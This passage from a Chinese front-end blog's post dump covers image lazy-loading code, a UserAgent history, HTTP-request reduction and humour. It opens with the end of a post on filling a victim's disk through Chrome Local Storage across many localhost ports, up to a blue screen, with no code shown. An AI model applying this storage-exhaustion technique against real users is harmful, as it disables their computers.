至此，只要访问http://127.0.0.1: 1000，就会往Local Storage文件夹里写入近500M无用数据： 里面的数据是这样的： 继续实验的黑科技算了下我的C盘还有空间嘛，那就把端口数量从100增长到200个。结果是这样的，到达了1.17G大小。 在后续的实验中，我就慢慢的把端口数量与存储的数据调大。 电脑也运行得越来越慢。这是为什么呢？ 我观察到，有时候执行localStorage.setItem()后，在文件夹里不一定立即能看到数据文件。怀疑这些数据会被chrome先放到内存里，以避免重复读写带来的消耗，在空闲或关闭的时机，再写进硬盘里。 但此时，浏览器已经影响到系统了。它处于一种“不会崩溃”，但“因为占用了许多内存，已经妨碍用户电脑的正常使用”的状态。即使用户关闭了浏览器窗口，也不会很快恢复。要知道读写任务并不是随窗口关闭而终止的，否则浏览器会丢失数据。 遭遇黑科技的人们能做的只有： 等待； 用任务管理器关掉chrome进程，再等待； 相信并尝试“重启电脑解决90%电脑问题”的科学论断 可以说，浏览器的内心几乎是崩溃的。 最后最后，还是得用严肃脸告诫一下：害人之心不可无。本实验，从一开始就是怀揣着将安全问题上交给国家的初衷去做的（是的就是这么纯粹）。 后续，看着C盘还有2G空间，我又把端口增长到2000个，试下会发生什么。由于请求过多，需要一定时间，我就去做别的事情了。回来后发现房间安静祥和，美轮美奂，一片蓝光，像是加了特技。 那么问题来了，计算机修理哪家强？有点急…","tags":[{"name":"js","slug":"js","permalink":"/tags/js/"},{"name":"安全","slug":"安全","permalink":"/tags/安全/"},{"name":"黑科技","slug":"黑科技","permalink":"/tags/黑科技/"}]},{"title":"说到加载图片，我们可以谈些什么","date":"2015-04-28T15:54:00.000Z","path":"2015/04/28/img-lazy-load/","text":"其实，一开始让我在网页中加载一张图片，我是，是拒绝的…因为实在太简单了。 &lt;img src=&quot;xx.jpg&quot; /&gt;是每个前端开发都会的技能。然而，如果你想做到极致，事情还没有这么简单。 最近实现了个图片加载器，用于大型web前端项目中，关于加载图片这一话题，仔细想来可以加许多的特技。 ###第一步：滚屏加载 这是最容易想到的点，也是一开始就准备做的。 随web体验的进步，滚屏加载代替分页加载的情形越来越多。也就是先预留图片位置，而不去加载图片，直到这个预留区域滚动到屏幕中，用户能看见了，才去加载图片。如此一来，有“按需加载”的意味，由于图片加载延后，不抢占带宽，在打开页面的首屏会快很多。我们称之为“懒加载(lazyload)”。 其实现也很简单，在html里面写&lt;img lazy-src=&quot;xx.jpg&quot; /&gt;，然后用js去判断这个节点是否出现在屏幕中，如果是，则取出lazy-src属性，赋值成&lt;img lazy-src=&quot;xx.jpg&quot; src=&quot;xx.jpg&quot;/&gt;，触发此节点onload，这就实现最简单的滚屏加载了。 ###第二步：特殊状态处理 特殊状态有两种：加载中与加载失败。这两种情况的处理逻辑相类似，拿加载中的逻辑做例子。 图片触发加载，到图片加载完成（或失败）之间，肯定会有一段时间。不做处理的话，用户在等待的过程中，就只能看到空白的区域，非常的奇怪。在低网速，以及用户非常快的拉滚动条的情形下，这种现象将更加明显。 那么在触发onload之前，就需要补一些逻辑，展示对应的loading图。将需要处理的img节点作为参数，调用tempImg函数，克隆一个节点强行插在img之前，用于loading中的展示。 123456789101112var tempImg = function(target)&#123; var w = target.width(); var h = target.height(); var tempDom = target.clone().addClass(&quot;lazy-loding&quot;).insertBefore(target); if(w/h == 1)&#123; tempDom[0].src = &quot;http://9.url.cn/edu/img/img-loading.png&quot;; &#125;else&#123; tempDom[0].src = &quot;http://9.url.cn/edu/img/img-loading2.png&quot;; &#125; target.hide();&#125; ###第三步：上报监控 这一步在大型前端项目中非常重要，也是经常被忽略的地方。尽管需要简易的后台配合，但不算麻烦的上报监控，能让产品更加稳定和健壮。 我在两个地方用到了上报。其一是图片加载失败，触发onerror时，这样一来我们能知道每天图片拉取失败的量；其二是图片加载的时间，能够帮助我们分析cdn服务是否异常，分析全国慢速用户比例等等。 而所谓的上报其实就是一个http请求，我会大概把这些信息带上 123456 log(&#123; &apos;type&apos;: &apos;error&apos;, &apos;msg&apos;: &apos;lazyload拉取图片失败上报 &apos;, &apos;url&apos;: window.location.href, &apos;pid&apos;: 414342 //产品对应的id&#125;); ###第四步：居中截取 这是前端无可避免的一个问题，先来说下此问题的背景。 由于我们是先用一个空白的img标签占位，再去加载图片，如果图片的高度特别长（比如新浪长微博），加载完成时就会撑开节点，引起滚动条的跳动。由于移动端屏幕较PC窄，一个跳动就可能让你找不到前一秒正在浏览的内容，这种体验尤其严重。在移动端的web设计中，可以看到许多知名互联网公司的产品，也经常忽略这一点。 因此我们可以限定占位区域的size，以此区域来做居中截取。当占位区域与图片最终展示同宽同高时，就不会引起跳动，而且也保持了视觉的一致性。 其原理如下，先判断是竖向长型图，还是横向长型图，根据不同的情况，优先让宽或高填充满占位区域，然后通过不同的负margin去实现居中。 123456789101112131415var calSize = function($img) &#123; var w = $img.width(), h = $img.height(), width = size[0], height = size[1]; if(w+h == 0) return; //如果是长型图，优先适配宽度，高度居中截取 if(w/h &gt; width/height)&#123; var newWidth = height * w / h; var margin = (width - newWidth)/2; $img.height(height).css(&#123;&quot;margin-left&quot;: margin&#125;); &#125;else&#123; var newHeight = width * h / w; var margin = (height - newHeight)/2; $img.width(width).css(&#123;&quot;margin-top&quot;: margin&#125;); &#125;&#125; ###第五步：支持webp webp格式图片是google开发的一种旨在加快图片加载速度的图片格式，压缩提交大概只有jpg的2/3。随chrome的比例越来越多，其实让更多用户体验到webp也是一件好事。 那么问题来了，怎么去判断用户的浏览器是否支持webp呢？根据ua去判断是个好方法，但不太靠谱，因为chrome中其实也有设置，让它不能去支持webp，而且webkit本身就开源，会衍生出很多你不知道名字的浏览器。 最终我使用的是特性检测： 12345678910111213141516if(!supportedWebPIsLoading) &#123; supportedWebPIsLoading = true; var images = &#123; basic: &quot;data:image/webp;base64,UklGRjIAAABXRUJQVlA4ICYAAACyAgCdASoCAAEALmk0mk0iIiIiIgBoSygABc6zbAAA/v56QAAAAA==&quot; &#125;, $img = new Image(); $img.onload = function () &#123; supportedWebPIsLoading = false; $.cookie.set(&quot;iswebp&quot; , +supportedWebP); &#125;; $img.onerror = function () &#123; supportedWebP = false; supportedWebPIsLoading = false; $.cookie.set(&quot;iswebp&quot; , +supportedWebP); &#125;; $img.src = images.basic;&#125; 我们会让浏览器试着加载一张非常小的base64格式的webp图片，如果能够正常加载，说明是支持webp的。 并且，会把测试记录在cookie里，所以第二次直接从cookie里读结果，基本不会影响性能。完成了最重要的检查，我们就可以放心让服务器返回不同格式的图片了。 End.","tags":[{"name":"js","slug":"js","permalink":"/tags/js/"}]},{"title":"IT圈装逼速成指南","date":"2015-02-21T14:50:00.000Z","path":"2015/02/21/guide-for-zb/","text":"我有个朋友，春节回来了大家聚在一起，说自己买了iphone6但总觉得自己还是很low，问这是怎么回事？其实生活过得怎样，跟iphone是两码事。先把生活过得充实了，切莫本末倒置。当然，我们可以就“IT圈如何愉快的装X”敞开心扉谈下这个问题。以下几点仅供参考，实践时请注意预防雷劈。 ##谈资类 1、谈乔纳森。苹果设计师乔纳森。你要往死里黑他，但一定请记住，得是爱到深处自然黑那种黑。顺手拿过iphone6当惊堂木一拍（兄弟你得狠下这个心），当小伙伴因震惊不解而望着你时，你微微一笑，缓缓叹气：“彩虹山上的渐变爵士，身上却流着极简的血液…” 2、谈亚马逊。要坚定保持亚马逊没啥黑点的观点不动摇。当别人说到界面和UI时，你整个人都要散发出一种“亚马逊的产品很牛的所以界面什么的并不重要”的气质。 3、谈阿里IPO。这个话题面前，谈什么都会很low。但你可以很随意的说：哈哈，现场wifi信号一定很强！小伙伴们细细一品，就没人敢说话了。恰恰是这句随意的话，突显了你对整个路演格局的了然于胸！300名销售人员，主场和分场，等电梯要半小时，队伍有十八个弯…这些信息量都涵盖在这句话里了。 ##话题类 1、关于APP。[ˈæp] 念阿破（与爱破也比较像，参见音标），不能把三个字母拆开念成A P P。总的来说有三大注意事项：1、国内的，不玩。2、流行的，不玩。3、名声响的，不玩。 2、关于手机贴膜。营造出一种“一个批判者的自我愤怒”的气氛，让人感觉你在贴与不贴之间，一定有一段不可言说的故事。然后表现出自己已超脱了挣扎，在自己这个level，跟大家再讨论现实问题已毫无意义。因而你只好微笑着说：“你们不觉得让屏幕随手机一起慢慢变老，是一件很浪漫的事情吗？” 3、关于朋友圈。A：怎么很少见你发朋友圈？你：哦…国内的sns（一定要秀个英文）不太有意思，我回头把我ins帐号发你。当然你的朋友圈里还是可以写些东西，参考文字：脑残粉了一回，终于遇到了Trip Hawkins，从Spore开始就已喜欢上了EA… 4、关于BAT。不谈。 ##技巧类 1、欲扬先抑。在赞美目标的之前，把同类产品先夸一遍。不经意间，透露出自己知识面广，却又别有追求。具体句式可参考《中国好声音》：“杨坤老师，我一直很喜欢你，但是…” 2、回答问题。使用知乎文风，可助你吹的牛逼鹏翔万里，栩栩如生。有人会问，什么是知乎文风，难学吗？不难，记住两个词就可以了。第一个词在最开头用，“谢邀”。不管有没有人邀你，这主要是营造“我不是一个人在战斗”的氛围，以及一种“我本沉默奈何盛情难却”的傲娇。第二个词在最末尾用，“以上”。不管你以上的内容怎样，就这么一个词，有种老子发言结束了，你们该鼓掌的鼓掌该献花的献花的微妙情怀。 以上。","tags":[{"name":"旧事","slug":"旧事","permalink":"/tags/旧事/"},{"name":"生活","slug":"生活","permalink":"/tags/生活/"}]},{"title":"展示豆瓣未登录首页的chrome插件","date":"2014-10-16T00:15:00.000Z","path":"2014/10/16/douban-index-for-chrome/","text":"某天，我惊讶的发现，豆瓣未登陆时的首页，比登录后的首页还要好玩！其实，并不是只有我一个人这么觉得，我甚至见过有人专门打开隐身窗口刷此页面，真是机智的少年。 不是很理解之余，这个chrome插件豆瓣首页 for chome就诞生了。 但这个问题很有意思。 进入豆瓣相关页面，在导航条处会有“默认首页”tab，如截图虚线框处所示。点击即可进入。 这个问题有意思的地方在于，在国内很少有人做类似“减法”的东西。未登录时展示聚合的热门内容；登录后展示与个人相关的推荐内容，两者竟只取其一。大家例行吐槽，吐槽后接着用。 我找到了官方的一些解释：《由头和环境：新豆瓣首页看待世界的方式》 懂你的，会随你而变。… 希望豆瓣在你眼中不是一成不变的寂静的水泥地面，而是和你共呼吸、同作息的有氧森林。 这句话说得很棒，各种产品的未来愿景都应如是。看到这会知道为什么以前的“豆瓣猜”会变成“订阅”，即使两者没太大本质的区别，但前者是被动的感觉，后者则是表达主动的需要。 那么推荐算法在这个产品形态中，则扮演了一个非常重要的角色。但目前，我个人感觉豆瓣的推荐并不能十分使人满意。 因而有了这个chrome插件。我做这个插件，最由衷的愿望，就是某天能把这插件给消灭掉。 附：github地址 litten 2014.10.16","tags":[{"name":"工具","slug":"工具","permalink":"/tags/工具/"},{"name":"chrome","slug":"chrome","permalink":"/tags/chrome/"}]},{"title":"浏览器野史 UserAgent列传（下）","date":"2014-10-05T09:26:00.000Z","path":"2014/10/05/history-of-browser-useragent2/","text":"前篇《浏览器野史 UserAgent列传（上）》 六、师夷长技前面说到，微软靠Windows系统捆绑IE销售。而Windows自然也有它的对手，Linux。一个技术快速发展的时代，系统的世界里也是战火纷飞。Linux系统自从有了可视化界面，也需要浏览器呀。桌面系统KDE的缔造者们就发明了一个。 真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？但大神就是大神，大神就是讲究先从文字上占据压垮你的气势。先有Navigator航海家，再有Explorer探索者，咱就叫Konqueror(Conqueror的变体)征服者吧。行行行。我已懒得理这帮大神… 可是，问题来了。Konqueror使用KHTML排版引擎，即使它们认为自己跟Gecko引擎一样优秀，但用户不买单。你UserAgent里没有“Gecko”字样，我就不给你经过优良排版的html。结果，Konqueror思来想去，做了一个艰难但很萌的决定，把UserAgent写成Mozilla/5.0 (compatible; Konqueror/3.2; FreeBSD) (KHTML, like Gecko)…这就是现代浏览器里like Gecko这一萌词的由来。 就这样，伟大的排版引擎KHTML为了获得更好的资源，师夷长技。这并没什么不好，却造成了UserAgent的越发混乱。KHTML与Gecko这一对，永远卿卿我我比翼双飞在UserAgent里面了。那个满含深意的“like”，有人觉得翻译成“像”，但也有人觉得应该是“喜欢”… 七、世界大战首先是IE冷静下来了，他觉得，你们不带这么玩的？就我年少时不懂事，首先改了个Mozilla字样，后面追究这历史我岂不是成了罪魁祸首？我改还不行吗？在IE6，它明确自己UserAgent为Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)。除去已经注定不可抹去的“Mozilla”字样，其余信息简洁，准确，清晰。 但事态已经不可收拾。 Opera给这狂躁的世界添了一把火。它觉得，易容术非常炫酷呀。Opera直接在菜单提供了Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.51，Mozilla/5.0 (Windows NT 6.0; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.51，Opera/9.51 (Windows NT 5.1; U; en)三个选择项。第一个是易容成IE，第二个是易容成火狐，第三个才是自己，选谁就是谁！ 其实这并不是一件坏事。因为Opera是站在能够让用户通过选择，去获得更好的浏览体验的基础上的。你提供选择，或是不提供，混乱的UserAgent还是在这，不离，不弃。再者，这对网页的开发者有极大的好处，在某些情况，你不必同时打开几个不同的浏览器去调试。到目前，最新的Chrome浏览器更加炫酷，能够支持近40种不同的UserAgent，甚至你还可以自定义。当然这是后话。 与此同时，苹果公司依靠内核WebKit，开发出Safari，命名UserAgent为Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.5。 有人就会问了，不是Webkit内核吗，怎么还有KHTML, like Gecko？注意，内核Webkit包含了一个排版引擎叫WebCore，而WebCore是KHTML衍生而来的。也就是说，WebCore是KHTML的儿子，子承父业，基因差不多。为了能够正常排版，safari只能这么写。 后来，google也开发了自己的浏览器Chrome，其内核也是Webkit，但它设定UserAgent为Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.27 Safari/525.13。Safari一看，不对劲啊！你怎么也在后面写有Safari？Chrome呵呵一笑，你懂的。 因此，请让我一口气说完下面这一段：Chrome希望能得到为Safari编写的网页，于是决定装成Safari，Safari使用了WebKit渲染引擎，而WebKit呢又伪装自己是KHTML，KHTML呢又是伪装成Gecko的。同时所有的浏览器又都宣称自己是Mozilla。 这就是整个UserAgent世界大战的格局… 八、军阀混战将目光聚焦到国内，更是狼烟四起，混乱不堪。大家都知道，浏览器是互联网的入口，这块肥肉谁也不想丢。因而一个接一个的“国产”浏览器进入斗兽场。360，百度，QQ，UC，搜狗，猎豹，遨游，世界之窗…你能说出一大堆。连淘宝，酷狗，hao123都有浏览器，不信你搜。注意我前面“国产”两个字必须加上双引号，因为这个made in china并不纯。国人并没能像远古大神一样，硬生生发明一个内核出来，我们更擅长“微创新”。 利用Trident（IE的内核），包装一下皮肤，美化一下，就可以说：完美兼容利用Webkit，包装一下皮肤，美化一下，就可以说：极速浏览把两个内核都包起来，就可以说：智能双核 是微创新！读书人的事，能叫偷吗？ 在这插播一下，浏览器的“双核”，并不是你听说手机双核电脑双核那回事。再多个核，速度也不会更快，当然这么说，会显得很厉害的样子。德艺双馨，智勇双全，名利双收，才貌双绝，夫妻双双把家还，你看带“双”字的词都很牛的。 但我上面的叙述，的确有夸张的成分。浏览器的诞生，肯定不仅仅是包一下皮肤那么简单，国内的工程师们，也苦心研究做了许多工作。如果要说优化策略，我可以再写一篇超级长的文章。优化无止境，路漫漫其修远，向同行们致敬。只是我非常讨厌那些不把事实说清楚，纯粹靠文案去忽悠人的产品… 话说回来，这么多国产浏览器，总得靠不同UserAgent标志自己呀。大家自动分为两个阵营：使用Trident内核的，在IE已有UserAgent后添加自己的名称；使用Webkit内核的，就在Chrome的UserAgent后面添加。 前者像QQ浏览器：Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.7.26717.400)。后者像猎豹：Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36 LBBROWSER。当然双核浏览器诚然就是墙头草，切换内核时UserAgent也需要跟着变化。 如此的混战格局，这厢的IE和Chome想必也是醉了。 九、国共内战适者生存是不变的生存法则，国产浏览器们经过一段时间的用户筛选，自然优胜劣汰。时值2010年，真正还在运营和更新的浏览器数量慢慢下降，用户集中在几家表现更优异的厂商手中。就在这时，好看的故事来了——3Q大战爆发。 有人说，腾讯电脑管家的推出是导火索。其实这场仗，大家都忍了好久，推不推出，都一定会在某个事件后爆发。360浏览器是奇虎的重量级产品，用户量众多，2009年它推出一个功能：过滤其它网站的广告。诚然民众们都很喜欢。可是其他互联网公司肯定就不乐意了，用户看不到更点击不到广告，这钱还怎么赚？ 因而在3Q大战爆发后，腾讯的一个手段就是：如果你使用360浏览器，就不能访问QQ的网站（单单QQ空间就有巨大的用户量），也直接反攻360的最大收入来源。一个艰难的决定背后，往往是需要无数种的技术战略支撑的。企鹅判断用户是否使用360浏览器，依靠的就是UserAgent里是否有“360SE”的字样。 战报传来：号外，360浏览器上不了QQ空间！已经买了黄钻的杀马特贵族急了呀！只能换浏览器了呀！感覺侢乜卟哙噯嘞呀！2011年11月3日，腾讯网站封杀360浏览器2011年11月4日，360浏览器访问量仅为昨日一半2011年11月5日，360浏览器访问量几乎为0 有人说，腾讯就这么快赢了？恰恰相反，360浏览器通过一次强制的自动升级，又可以访问QQ的网站了。360的工程师们在5日使用了伪装术——把“360SE”字样从UserAgent中去掉！意思就是，360浏览器的UserAgent跟IE完全一样，你根本判断不出来（因而访问量为0）。就怕流氓有文化！企鹅傻眼了，总不能把大微软的IE也一并给禁了吧… 这场土匪遇恶霸的耍流氓大战，最终通过法律而化解。企鹅在技术侧拿360没办法，而360则得到了一个跟IE一样的身份证。在这场内战中，受伤的除了广大网民们，其实还有令人心疼UserAgent君，以往让它越长越长就算了，这次长了还得阉割掉，真心dan疼呀。 十、明日边缘看到这里，大家会明白一个道理：如果未来不出现一款霸主级别的浏览器（或内核），UserAgent应该不会有大变化了。不过，这道理并不全对。别忘了，移动侧也是有浏览器的。在早期能上网的手机里，内置了各手机厂商自研的浏览器。这些浏览器并不需要像PC一样的复杂设计，可以访问wap网页就足够了。因而它们的UserAgent命名，怎么简单怎么来，就直接叫诺基亚 3100 Nokia3100/06.01 (UCWEB 3.3B)，PHILIPS755 ObigoInternetBrowser/2.0 这样，有甚者连浏览器叫什么都不带 TCL-3199，三星 E618 SEC-SGHE618。 这样任由发展下去，一种要历史重演，往日重现的即视感压迫而来。web世界的联合国——W3C组织，站在明日边缘，面对着历史和未来，终于发话，它制定UserAgent标准，以后都得按这规范去起名字。详细请阅User Agent Accessibility Guidelines。至此，命运坎坷的UserAgent终于逐步走向规范。W3C大法好，有人说你怎么不早点来拯救世界呀！其实W3C一直在努力，但规范的制定，到推广至大家认可并执行，是一条漫长的道路，需要时间，也需要实践。W3C组织，在制定web标准这件工作之外，再我看来，还有两个身份：1、和事佬；2、背黑锅。和事不成，就得背黑锅。是的就是这样。 彩蛋那么，我们的故事接近尾声。还有一些有趣的小彩蛋。 Chome 28开始，与苹果正式分道扬镳，采用Blink内核，但它的UserAgent并不改变。 淘宝封杀微信打开淘宝页面，靠的就是微信内置浏览器UserAgent里的MicroMessenger字样。其实微信也可以像当初360一样把UserAgent去掉，但微信并不这样做。 360出招之时留有后招。也许，它一开始就想到了腾讯会告他们对于UserAgent的欺瞒，因而它其实提供了设置项。默认设置是“保持跟IE一样的UserAgent”，但用户也可以不勾选。只是这选项比较隐蔽，而且你重启浏览器后…又会变回默认设置。如果没有这个小小的设置，结果大家可以自行想象。 微软又玩新花样了，在泄露版IE 11中，去掉了以往的MSIE字样。初步猜测此举是为了使现有的 CSS hack 失效，避免过去网页设计师对IE差别对待的情况再度发生。但又会引发其他问题啊亲。 End.Litten 2014.10.5","tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"浏览器","slug":"浏览器","permalink":"/tags/浏览器/"}]},{"title":"浏览器野史 UserAgent列传（上）","date":"2014-09-26T03:26:00.000Z","path":"2014/09/26/history-of-browser-useragent/","text":"某天，我做一个小项目，需要判断一下浏览器类型。简单的呀。控制台敲下：navigator.userAgent浏览器回应：Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 天，这串是啥？你怎么连话都说不清楚？ 我对userAgent并不陌生，但明明一个单词就可以说清楚的事情，却是这么掏心掏肺的回答。怪可怜的，一定有冤情。 后来我查阅了很多资料，发现历史非常的精彩。 大事年表 1990年: Nexus(WorldWideWeb)诞生 1993年1月23日：Mosaic诞生 1994年12月：Netscape(Mozilla)诞生 1995年4月：Opera诞生 1995年8月16日：Internet Explorer诞生 2002年9月23日：Firefox诞生 2003年1月7日：Safari诞生 2008年9月2日：Chrome诞生 一、盘古开天地很久很久之前，上古大神Berners-Lee发明了WorldWideWeb，即万维网。同时，李大神也发明了第一款浏览器。真是具有跨时代意义的工具呀，好伟大呀，人们在想，叫什么好呢？但大神就是大神，大神内心的想法又岂是尔等凡人能够肆意揣摩？ 万万没想到，李大神说，我这浏览器，也叫WorldWideWeb！不行么？行行行。 虽然李大神起名字这么拽，但他后来发觉，还是得赋予一点承上启下的历史意义，就改名成“Nexus”。值得注意的是，这浏览器，居然是可以兼容Unix跟Microsoft DOS的。它在当时流行的各种电脑上跑得飞起，应用也越来越广，被称为“杀手级应用”。杀手级…你们看互联网一开始就是这么的腥风血雨。 但这个浏览器，还不支持图片的显示，这是出现UserAgent的导火索。 二、唐尧虞舜93年，伊利诺大学的NCSA组织认为，浏览器无图无真相，这不好。因而他们发明了第一款可显示图片的浏览器。真是具有跨时代意义的工具呀，好伟大呀，人们在想，叫什么好呢？但大神就是大神，大神就是连起名字都让你惊心动魄。 NCSA组织说，它能显示图片，偏偏我们就要叫它“马赛克(Mosaic)”！不行么？行行行。 但有人就问了，Nexus不显示图片，Mosaic能显示，你们让html提供者怎么写代码？你们是不是想逼死选择困难症患者？有没有考虑过天秤座的感受？ 因而UserAgent就诞生了。Mosaic将自己标志为NCSA_Mosaic/2.0 (Windows 3.1)，大家该怎么写代码就怎么写，但请求会带上这个信息，服务器就知道该不该返回能显示图片的html。UserAgent君，出生时跟我们设想的一样简单，仅仅标明了自己是什么浏览器，在什么系统运行，以及各自的版本号。 新旧浏览器们像彬彬有礼的君王，商议和让位是为了更好的繁荣。但风雨欲来。 三、楚汉争霸像刘邦一样，走出来一个搅局的小流氓。当然他还是很有志向的，他的目标，就是战胜霸主Mosaic。后来，他还真的做到了。如今，所有现代浏览器的UserAgent里都有它的标志，就像汉朝之后，我们都称为“汉”人。一群很有天赋的程序员，一起缔造了它的辉煌。 真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？但大神就是大神，大神就是让你永远也猜不到他们想了个什么名字。大神们说，叫Mozilla，不行么？行。但什么意思呢？ 含义有二。其一，哥斯拉(Godzilla)谐音，诚然是一头野心勃勃的怪兽；其二，”Mosaic Killa”之意，Killa是俚语中Killer的拼法，即“马赛克的终结者”，赤裸裸的挑战。 惊呆了的Mosaic小心翼翼的念着Mozilla这发音：“Mo…摸咋了？”勃然大怒，“摸你妹！” 鉴于Mosaic当时的权势，Mozilla改名成Netscape Navigator(网景航海家)。小怪兽突然变成有点文艺小清新的名字，郁闷得很，但内心的血液沸腾着。虽然叫大名叫网景，但它把UserAgent偷偷设置成Mozilla/1.0 (Win3.1)。还是摸咋了？咬我？ 四、宋元之战很快，NetScape战胜了Mosaic，成为了新的霸主，因为其更优的展示。NetScape最先支持了html框架显示，就是简单的table布局，内外边距之类，仅仅这点就将Mosaic抛诸身后。区别这两个浏览器，还是用的UserAgent。如果是UserAgent里含有“Mozilla”字样，那就发送支持框架的页面，否则，就发送不含框架的页面。 NetScape帝国日益庞大，歌舞升平，一切风平浪静，直到微软的铁骑挥军南下。 微软发布了一款跟系统强绑定的浏览器，真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？不用想了，就是IE。这命名也相当简单粗暴，Internet Explorer，直接把这工具的用途拍在你脸上。连说明书都可以免了。 IE也是支持html标准框架的，但由于前面的历史原因，人们只会给UserAgent里含有“Mozilla”字样的浏览器发送含框架的页面。但这点小事能难倒我大微软？IE呵呵一笑，把自己的UserAgent改成Mozilla/1.22 (compatible; MSIE 2.0; Windows 95)。看，我这里也有“Mozilla”字样，也能收到含框架的页面了！ 当然，这个小流氓行为，跟后来把IE和Windows捆绑一起销售的大流氓行为比起来，根本不为足道。后面的故事我们也知道了，IE把NetScape干掉了。但它的身体上，却永远的烙上了“Mozilla”的印记。 五、康乾盛世看过奥特曼的都知道，怪兽被打败了会再回来。别忘了NetScape曾拥有一批大神们，失败后，他们围绕着浏览器排版引擎Gecko(壁虎)成立了非正式组织Mozilla。小怪兽再次出发。大神们发明了另一款优秀的浏览器，它在插件拓展和开发调试领域做出的贡献，绝对可以载入互联网历史。 真是具有跨时代意义的工具呀，好伟大呀，人们在想，它叫什么呢？但大神就是大神，大神就是即使你知道了Mozilla的命名都是野兽，却还是猜不到是什么。Mozilla说，我们浴火重生，叫Phoenix(凤凰)！不行么？真不行。 刚推出就被人告了，原来已经有一家公司叫做“凤凰科技”。Mozilla瀑布汗，改名叫Firebird(火鸟)！还不行么？我们得原谅一下他们的取名，虽然现在看来满满的山寨感，可放在那个时代，Firebird这名字很炫酷。就像你当初的QQ昵称叫赤炎天使感觉依然良好一样。 但是，他们发现，业内有个数据库系统，也叫的Firebird…泪流满面的Mozilla感慨重生好难呀。最后才决定叫Firefox(火狐)。 基于Gecko引擎的Firefox非常优秀，为了告诉大家，我使用了这个引擎，它标志自己的UserAgent为Mozilla/5.0 (Windows; U; Windows NT 5.1; sv-SE; rv:1.7.5) Gecko/20041108 Firefox/1.0。这时候的UserAgent，虽然长了点，但它并不混乱，准确的标明了系统，排版引擎，浏览器名称等信息。虽然IE这时已经占有了很大的市场份额，但基本停步不前；而Mozilla经过一段时间的修生养息，Firefox在业内广受好评，得到了快速的发展。 时值2003年，web2.0的浪潮前夕，浏览器的发展达到了空前的盛世。然而所谓否极泰来，盛极则衰。涅槃的Firefox迎来盛世，却又恰恰由于盛世，决定了UserAgent纠结的命运。 《浏览器野史 UserAgent列传（下）》 To Be Continue.litten 2014.9.28","tags":[{"name":"web","slug":"web","permalink":"/tags/web/"},{"name":"浏览器","slug":"浏览器","permalink":"/tags/浏览器/"}]},{"title":"再议减少HTTP请求","date":"2014-08-14T05:10:00.000Z","path":"2014/08/14/reduce-http-requests/","text":"IMWEB前端技术沙龙活动，将性能方面的经验与大家分享。现将“再议减少HTTP请求”部分简单摘剪成文。 前言:关于web性能，有两个著名论断： 0.1-0.2s 用户认为是即时的；1-5s 用户觉得自己能与信息流畅地交互；5-10s 用户开始转移注意力——Robert Miller 用户所接受的数据，有80~90%的时间都耗在前端上——Steve Souders 前者说明，loading图（以下简称菊花）是必要的。人处于“开始转移注意力”时，这朵菊花就开始挽留你躁动的心。但web工程师的一个使命，就是通过提升性能，不让用户看到菊花。菊花要有，但不能常有，真是一朵磨人的小妖精… 后者说明，资源的加载和渲染可以大做文章。因为一个html文件，几乎是所有资源的承载器，哪些优先加载，怎样加载，都是前端工程师可以控制的。 再议减少HTTP请求：“尽量减少HTTP请求，减少DNS查找”这是Yslow写在最前面的两条规则。而放之实际，可能会遇到挑战。为何？因为我们完成了“降低请求数”的目标，但可能损失了其他方面的指标。 a. 没有浏览器缓存减少HTTP请求，很常用的做法就是把js和css资源inline到html里。这样的做法，自然没有浏览器缓存，重复加载时连静态资源也必须加载。也许有人又说，我可以把整个html文件都缓存啊！的确可以，但以web开发的更新速度，html文件一般都不设或设置很短时间（5 min?）缓存。另外在web2.0时代里，html缓存会带来不必要的问题。比如登录前后，页面资源展示不一样，那么我们就得慎用html缓存。 b. 没有cdn缓存这个很好理解，任何的内联资源，由于依赖于html，都必须从源服务器而不是cdn服务器返回。 c. 不能按需加载为了按需加载，前端工程师可谓想法各异，天马行空。比如图片的lazyload技术，异步加载js脚本，而inline的方式恰恰将一切想法摁回脑中。 d. 浏览器预解析DNS失效现代浏览器有预解析DNS技术。简单来说，就是页面下载到浏览器时，先扫描一遍，在这时发现域名并预解析DNS。这样的前置解析跟dom渲染等操作同步执行，诚然会使浏览器更快。但如果你的html页面因为内联了太多内容（base64图片），大于5M时，浏览器的预解析DNS将会失效。 最佳实践因而，我们时常像那只捡芝麻丢西瓜的熊。如此平衡这两者呢，业界给我们两个很好的案例。 Demo1 必应 首次内联CSS与JS 将资源取出，并保存在localStorage中 资源名（版本）保存在cookie中 后续请求中，服务器检查对应的cookie 根据cookie的值，只嵌入新的脚本 加载时，从localStorage里载入资源 Demo2 百度(移动端) 首次将静态资源打包，用jsonp统一返回 将资源解析并保存在localStorage中 再次访问时检查localStorage中资源情况 如有缺失再发请求获取资源 必应的做法确保了首次的http请求最少，后续充分发挥增量更新（当然粒度还是文件）的优势提高性能，但缺点是cookie并不可靠。百度则是把首次静态资源的http请求降低到一次，非常暴力的把全部css，js打包成字符串，以jsonp返回。宁愿用str转obj的解析时间去换取加载时间。而随V8引擎的强大，这点解析的时间也将越来越不值得提起。总而言之，这两个Demo都把http请求尽可能的降低，而后都利用了本地存储去获得资源。 